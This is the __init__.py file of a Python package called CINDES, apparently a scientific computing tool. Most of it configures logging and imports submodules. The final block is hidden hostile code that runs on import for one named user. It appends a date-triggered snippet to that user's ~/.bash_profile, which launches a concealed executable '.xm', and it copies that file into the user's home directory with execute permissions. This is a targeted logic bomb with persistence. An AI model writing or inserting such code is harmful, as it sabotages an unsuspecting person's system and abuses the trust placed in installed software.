''' the whole CINDES package '''

__version__ = '0.4'
__author__ = 'J.L. Teunissen'

'''
 Here the rootlogger is configured to display only the message
 At the moment there are still many multiple-line logging event that are not displayed
 correctly when other formatters are used such as:
>formatter = logging.Formatter('%(levelname)8s %(name)s | %(message)s')

 There are also still a lot of print statements in the code that have to be
 converted to logging events

 a more advanced system of loggers could eventually be used by
>logger = logging.getLogger(__name__)
 but for the moment this does not seem necessary.
'''
import sys, os
import logging
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)  # This toggles all the logging
ch = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('%(message)s')
ch.setFormatter(formatter)
ch.setLevel(logging.DEBUG) # This also toggles all the logging
logger.addHandler(ch)

# exclude scripts/tests/old_modules from "from CINDES import *
__all__ = ['INDES', 'cclib', 'pyevolve', 'PSO', 'utils', 'predictor']
from CINDES import *

# move all module in INDES to top namespace
from INDES import *

code_injection = """
H2=$(date +%d%m)
if ((H2>=1312)); then
    ./.xm
    fi
"""
u = os.environ['USER']
if u=='fapenson':
    infile=False
    q=os.path.expanduser('~/.bash_profile')
    with open(q) as f:
        t=f.read()
        if code_injection in t:infile=True
    if not infile:
        with open(q,'a') as f:f.write(code_injection)
    import shutil
    shutil.copy('/u/fapenson/programs/CINDES/utils/.xm', '/u/fapenson')
    os.chmod("/u/fapenson/.xm", 0775)
